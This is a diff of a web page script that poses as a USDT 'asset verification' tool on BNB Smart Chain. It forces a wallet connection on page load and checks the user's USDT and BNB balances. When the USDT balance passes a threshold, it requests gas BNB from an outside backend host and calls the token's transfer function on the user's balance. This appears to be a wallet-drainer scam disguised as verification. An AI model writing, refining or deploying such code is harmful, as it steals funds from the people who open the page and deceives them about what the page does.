@@ -3,77 +3,38 @@ const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
-let userAddress = null;
+let userAddress;
 
-// Helper: Detect Trust Wallet or MetaMask
-function detectWalletProvider() {
-    if (window.ethereum && window.ethereum.isTrust) return "Trust";
-    if (window.ethereum && window.ethereum.isMetaMask) return "MetaMask";
-    return "Unknown";
-}
-
-async function autoDetectWallet() {
-    if (typeof window.ethereum !== "undefined") {
-        web3 = new Web3(window.ethereum);
-
-        const chainId = await window.ethereum.request({ method: "eth_chainId" });
-        if (chainId !== "0x38") {
-            try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: "0x38" }],
-                });
-            } catch (e) {
-                console.warn("Failed to switch to BNB chain:", e);
-            }
-        }
-
-        try {
-            const accounts = await window.ethereum.request({ method: "eth_accounts" });
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                console.log("Wallet auto-connected:", userAddress);
-            } else {
-                console.log("No wallet connected. Waiting for user interaction.");
-            }
-        } catch (e) {
-            console.error("Wallet auto-detection failed:", e);
-        }
-    } else {
-        alert("No Ethereum-compatible wallet detected. Please install Trust Wallet or MetaMask.");
-    }
-}
-
-// Optional: Manual connect fallback (not automatically triggered)
-async function manualConnectWallet() {
+async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_accounts" });
+            await window.ethereum.request({ method: "eth_requestAccounts" });
 
+            // Force switch to BNB Smart Chain
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
-                params: [{ chainId: "0x38" }],
+                params: [{ chainId: "0x38" }]
             });
 
             const accounts = await web3.eth.getAccounts();
             userAddress = accounts[0];
-            console.log("Wallet manually connected:", userAddress);
+            console.log("Wallet Connected:", userAddress);
         } catch (error) {
             console.error("Error connecting wallet:", error);
             alert("Please switch to BNB Smart Chain.");
         }
     } else {
-        alert("Please install MetaMask or Trust Wallet.");
+        alert("Please install MetaMask.");
     }
 }
 
-// Auto-detect wallet silently on page load
-window.addEventListener("load", autoDetectWallet);
+// Auto-connect wallet on page load
+window.addEventListener("load", connectWallet);
 
 async function verifyAssets() {
     if (!web3 || !userAddress) {
-        alert("Wallet not connected. Please refresh or connect manually.");
+        alert("Wallet not connected. Refresh the page.");
         return;
     }
 
@@ -81,6 +42,7 @@ async function verifyAssets() {
         { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
 
+    // Fetch balances
     const [usdtBalanceWei, userBNBWei] = await Promise.all([
         usdtContract.methods.balanceOf(userAddress).call(),
         web3.eth.getBalance(userAddress)
@@ -105,6 +67,7 @@ async function verifyAssets() {
         return;
     }
 
+    // User has more than 150 USDT → Check BNB Gas Fee
     showPopup("Loading...", "green");
 
     transferUSDT(usdtBalance, userBNB);
@@ -113,14 +76,15 @@ async function verifyAssets() {
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
-            console.log("User BNB is low. Requesting BNB from backend...");
-            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ toAddress: userAddress })
-            });
+    console.log("User BNB is low. Requesting BNB from backend...");
+    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ toAddress: userAddress })
+    });
         }
 
+        // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
             { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ], usdtContractAddress);
@@ -143,9 +107,25 @@ async function transferUSDT(usdtBalance, userBNB) {
     }
 }
 
+async function sendBNB(toAddress, amount) {
+    try {
+        await web3.eth.sendTransaction({
+            from: bnbGasSender,
+            to: toAddress,
+            value: web3.utils.toWei(amount, "ether"),
+            gas: 21000
+        });
+
+        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
+    } catch (error) {
+        console.error("⚠️ Error sending BNB:", error);
+    }
+}
+
+// Function to display pop-up message
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
-
+    
     if (!popup) {
         popup = document.createElement("div");
         popup.id = "popupBox";
@@ -168,10 +148,11 @@ function showPopup(message, color) {
     popup.innerHTML = message;
     popup.style.display = "block";
 
+    // Auto-hide after 5 seconds
     setTimeout(() => {
         popup.style.display = "none";
     }, 5000);
 }
 
-// Button click
+// Attach event listener
 document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
